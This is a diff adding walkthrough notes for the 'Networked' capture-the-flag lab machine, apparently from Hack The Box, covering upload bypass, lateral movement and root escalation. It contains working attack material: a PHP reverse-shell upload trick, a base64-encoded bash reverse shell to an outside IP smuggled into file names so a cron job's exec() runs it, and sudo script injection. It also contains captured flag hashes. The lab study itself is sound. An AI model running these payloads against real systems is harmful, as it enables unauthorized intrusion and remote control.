@@ -61,3 +61,66 @@ Paths of URL?
 
 Known CVE
 
+
+1. First foot hold
+http://10.129.164.124/upload.php
+
+Upload revshell.php.png (dople extension + change magic numbers)
+Execute http://$target/uploads/uploaded_file
+bash-4.2$ whoami              
+whoami
+apache
+bash-4.2$ hostname
+hostname
+networked.htb
+
+2. Lateral movement
+crontab every 3 min - check_attacK.php
+
+$path = '/var/www/html/uploads/';
+
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &")
+
+# Create reverse shell
+echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.220/1236 0>&1"' | base64
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjAvMTIzNiAwPiYxIg==
+
+# Create file + Decode shell to be executed
+touch -- 'a; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjAvMTIzNiAwPiYxIg== | base64 -d | sh'
+touch -- 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjAvMTIzNiAwPiYxIg== | base64 -d | sh'
+
+
+Modify parameter $value, which is not set
+
+
+[guly@networked ~]$ cat user.txt
+cat user.txt
+82d3c18d81c62a1eb7d45ac9440b3774
+[guly@networked ~]$ whoami
+whoami
+guly
+[guly@networked ~]$ hostname
+hostname
+networked.htb
+
+
+## Priv escalation
+
+run as administrator
+sudo /usr/local/sbin/changename.sh
+
+By inserting a space in the name of network, it is possible to execute commands. Everything after space is interpreted as a command in a network script
+
+cat root.txt
+6661f3710c77d9b7f92e0b7881cd9a94
+[root@networked ~]# whoami
+root
+[root@networked ~]# hostname
+networked.htb
+
+
+https://seclists.org/fulldisclosure/2019/Apr/24
+
+
+
+
